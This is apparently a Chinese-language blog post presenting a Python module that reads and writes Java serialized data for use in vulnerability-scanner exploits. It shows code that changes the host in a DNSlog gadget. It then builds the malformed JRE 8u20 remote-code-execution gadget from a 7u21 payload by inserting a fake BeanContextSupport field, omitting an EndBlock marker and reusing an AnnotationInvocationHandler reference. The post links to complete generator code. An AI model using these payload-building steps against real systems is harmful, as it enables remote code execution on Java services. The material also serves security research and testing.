## 简介
最近受朋友所托，在使用python写扫描器关于java反序列化漏洞的exp中，一直无法简便的生成payload。目前来说只有两种方法：

1. python通过命令调用java的Ysoerial.jar 去获取gadget。 缺点太多了，还要在线上环境中准备一个jdk，对于特殊的gadget，比如7u21 这种payload，还需要准备多个版本的jdk。
2. python直接写死gadget的字节码。

当然，上面两种方法都有一个最致命的缺点，那就是无法随意更改Suid值等反序列化属性。在反序列化攻击的场景中。经常会出现suid不一致而导致无法攻击成功的案例，当然，各种奇技淫巧都是在jar包中想办法，而很少有人在反序列化文件上动手。

于是，我按照java反序列化协议标准，使用python编写一个模块，可以做到自由读写java反序列化文件。当然，后期也可能会推出Java版。


生成8u20 gadget才是最具有挑战的事，因为网上的工具，操作起来基本都很复杂，需要手工计算handle等复杂操作。这对一个不懂java反序列化协议的人来讲，十分不友好。而且，8u20 gadget是一个畸形的反序列化数据。生成它需要很多复杂的工作

我们先从dnslog说起，从易到难，看一下如何使用javaSerializationTools模块读写java序列化文件

## 修改Dnslog gadget的网址

在这里我们不关心dnslog这个gadget是如何触发的，我们只关心如何修改dnslog地址。

修改dnslog的地址，其实也就是修改java.net.URL对象的host字段的值。所以我们先读取一个dnslog的反序列化文件，解析成功后保存为yaml文本格式的模板。

> json 不支持复杂对象的存储，比如java中经常会出现对象的循环引用，json无法表达这种关系，而yaml可以表达，但是牺牲部分可读性。主要为了降低工作量

示例代码如下:
```
    with open("../files/dnslog.ser", "rb") as f:
        a = ObjectRead(f)
        dnslog = a.readContent()
```

在这里我使用模块的`javaObject`类去表示一个java类。因为在反序列化数据中，只有对象，对象中的字段以及对象的类，如果存在额外数据，则添加到`javaObject`对象中的`objectAnnoation`列表中。下面我们来看截图，看一下dnslog是如何被解析的
![](https://potatso-1253210846.cos.ap-beijing.myqcloud.com//img20210121150908.png)

`loadFactor`和`threshold`是HasnMap对象的两个属性，在这里没什么好说的。下面来说一下我是如何保存java对象中字段的值。

在java中某个类可能继承自父类，父类也可能继承自爷爷类。java为了精准的保存某个对象，会将对象所有的字段都保存下来。在反序列化还原对象中，首先读取对象的类的描述。也就是如上图中javaClass所表示的一样。随后在还原对象的值中，会按照读取的类的描述中字段的顺序，先读取父类的值，再读取子类的值。所以我将字段保存为多维数组，按层保存。其中字段的顺序与javaCLass中描述的字段顺序必须一致。

下面再讲一下 `objectAnnoation`。在反序列化中，默认保存对象的所有值。但是对于HashMap这种对象来讲，对象中的值，也就是key和value是不固定的，没有办法保存。这时需要writeObject和readObject方法。writeObject方法是写入对象中额外的对象的特殊方法。经过writeObject方法写入的内容，会被写入到ObjectAnnotation中。readObject读取，也是读取ObjectAnnotation中的信息。在反序列化中，首先写入父类的字段值，如果父类存在writeObject，则再调用writeObject写入额外信息。然后再写入子类的字段值。writeObject函数在调用成功后，会向ObjectAnnotation中写入EndBlock标识终结。

对于hashmap对象来说，key和value分别存放到ObjectAnnotation中。我们需要想办法修改URL对象的host字段。URL对象的布局如下图所示
![](https://potatso-1253210846.cos.ap-beijing.myqcloud.com//img20210121152847.png)

修改起来很简单，代码如下
```
    dnslogUrl = 'bza4l5.dnslog.cn'

    with open('dnslog.yaml', "r") as f:
        dnslog = yaml.load(f, Loader=yaml.FullLoader)
    UrlObject = dnslog.objectAnnotation[2]
    # 修改java.net.URL的host属性为新的dnslog地址
    dnslog.objectAnnotation[1].fields[0][4].value.string = dnslogUrl

    with open('dnslog.ser', 'wb') as f:
        ObjectWrite(f).writeContent(dnslog)
```

dnslog.yaml 截图如下
![](https://potatso-1253210846.cos.ap-beijing.myqcloud.com//img20210121153009.png)


## 生成 JRE 8u20 gadget
上面简单对象已经讲完了，下面我们来说一下复杂对象的读写。我们只需要大概了解jre 7u21 payload的触发流程即可。以及修复方式如何被绕过的。

7u21的gadget中 `LinkedHashMap`的`readObject`触发`sun.reflect.annotation.AnnotationInvocationHandler`，最终触发RCE。修复方法如下图所示。readObject中会判断反序列化的类型，如果不是所期望的，则直接抛出异常。

![](https://potatso-1253210846.cos.ap-beijing.myqcloud.com//img20210121153545.png)

我们还需要回顾刚才讲的writeObject方法。假如一个对象在序列化过程中，调用writeObject方法。则java序列化中，是不会序列化任何字段值，一切交由对象的writeObject方法去处理。所以一般的writeObject方法中，只是保存额外信息，对象的字段值，统统交由defaultReadObject()去处理。

虽然`sun.reflect.annotation.AnnotationInvocationHandler`抛出了异常，但是对象以及所有的属性，其实已经还原完毕了。并且后面也可以调用。

我们分析一下原因，打开java序列化协议标准中关于还原对象的部分或者我自写的ObjectRead类的readObject方法

https://github.com/potats0/javaSerializationTools/blob/main/javaSerializationTools/ObjectRead.py#L150
![](https://potatso-1253210846.cos.ap-beijing.myqcloud.com//img20210121154457.png)

在java序列化协议中，为了防止循环引用，或者为了节约序列化后空间，会将出现一摸一样的对象中第二个相同的对象使用reference代替，你可以理解为c语言的指针。在还原对象中，首先为被还原对象建立reference，其次再还原对象的值。

在`sun.reflect.annotation.AnnotationInvocationHandler`的readObject中，我们可以看到抛出异常的代码后面，也没有额外信息可以供我们读取。所以，即使抛出了异常，但是对象也是被成功还原的，抛出异常前，对象的所有字段其实已经被还原完成了。所以我们想办法拦截异常信息，不打断正常的反序列化流程即可。这就是8u20 gadget的通俗解释。


在这里我们直接看`java.beans.beancontext.BeanContextSupport#readChildren`方法。在这里读取了额外的对象，并且也捕获异常信息。并没有打断正常的反序列化流程。
![](https://potatso-1253210846.cos.ap-beijing.myqcloud.com//img20210121155828.png)

刚才我们说过，ObjectAnnotation的结尾，存放JavaEndBlockData去标识本对象的ObjectAnnotation结束。但是现在抛出异常导致`BeanContextSupport`的ObjectAnnotation中JavaEndBlockData无法被正常处理。如果我们不删除这个javaEndBlock，就会导致后面读取全部错误。这也就是jre 8u20无法被第三方软件解析成功的原因。所以我们在生成BeanContextSupport中不能按照规定，在ObjectAnnotation的结尾处生成JavaEndBlockData标识。这也就是8u20 畸形数据的来源。


下面我们来看一下7u21 的解析结果，如图

![](https://potatso-1253210846.cos.ap-beijing.myqcloud.com//img20210121163238.png)

我们刚说过，在反序列化流程中，一般都是首先还原对象中字段的值，再还原objectAnnotation中的值。我们只需要插入一个虚假的字段到LinkedHashSet中，java反序列化中，如果遇到虚假的反序列化值，是不会影响正常的反序列化的流程的。

说起来容易做起来难，java序列化是不会生成这种畸形数据的。手工修改7u21的payload，插入一个新对象的话，后面所有的引用都需要一一修改。这个工作量听起来就很吓人，而且很容易出错。

所以我使用 javaSerializationTools模块，修改7u21的gadget，自动计算引用等。

首先向LinkedHashSet中添加一个新的字段，名字叫fake，类型为BeanContextSupport

代码如下
```

with open("../files/7u21.ser", "rb") as f:
    a = ObjectRead(f)
    obj = a.readContent()


# 第一步，向HashSet添加一个假字段，名字fake
signature = JavaString("Ljava/beans/beancontext/BeanContextSupport;")
fakeSignature = {'name': 'fake', 'signature': signature}
obj.javaClass.superJavaClass.fields.append(fakeSignature)
```

然后构造BeanContextSupport对象的值

```
        # 构造假的BeanContextSupport反序列化对象，注意要引用后面的AnnotationInvocationHandler
        # 读取BeanContextSupportClass的类的简介
        with open('BeanContextSupportClass.yaml', 'r') as f1:
            BeanContextSupportClassDesc = yaml.load(f1.read(), Loader=yaml.FullLoader)

        # 向beanContextSupportObject添加beanContextChildPeer属性
        beanContextSupportObject = JavaObject(BeanContextSupportClassDesc)
        beanContextChildPeerField = JavaField('beanContextChildPeer',
                                              JavaString('Ljava/beans/beancontext/BeanContextChild'),
                                              beanContextSupportObject)
        beanContextSupportObject.fields.append([beanContextChildPeerField])

        # 向beanContextSupportObject添加serializable属性
        serializableField = JavaField('serializable', 'I', 1)
        beanContextSupportObject.fields.append([serializableField])
```

最后处理objectAnnotation，因为BeanContextSupport的父类也有writeObject方法。根据协议，我们第一个值为javaEndBlock，第二个值才是`sun.reflect.annotation.AnnotationInvocationHandler`对象，在这里我们直接引用7u21 的`AnnotationInvocationHandler`对象。这样，真正起作用的`AnnotationInvocationHandler`直接引用第一个成功还原的`AnnotationInvocationHandler`的对象。而引用的对象，再被引用的过程中是不会调用readObject方法的。

代码如下
```
        # 向beanContextSupportObject添加objectAnnontations 数据
        beanContextSupportObject.objectAnnotation.append(JavaEndBlock())
        AnnotationInvocationHandler = obj.objectAnnotation[2].fields[0][0].value
        beanContextSupportObject.objectAnnotation.append(AnnotationInvocationHandler)

        # 把beanContextSupportObject对象添加到fake属性里
        fakeField = JavaField('fake', fakeSignature['signature'], beanContextSupportObject)
        obj.fields[0].append(fakeField)
```


当然在这里不需要计算handle，只需要使用ObjectWrite对象写入文件，即可自动计算handle等一切繁琐的事
```
    with open("8u20.ser", 'wb') as f:
        o = ObjectWrite(f)
        o.writeContent(obj)
```

8u20 gadget 布局如下图所示

![](https://potatso-1253210846.cos.ap-beijing.myqcloud.com//img20210121162757.png)

完整的代码详见 https://github.com/potats0/javaSerializationTools/blob/main/tests/test8u20/main.py



欢迎fork star项目，目前还在设计中，使用起来将会更加容易

项目地址 https://github.com/potats0/javaSerializationTools


![](https://potatso-1253210846.cos.ap-beijing.myqcloud.com//imgWeChat%20Image_20200612150038.png)
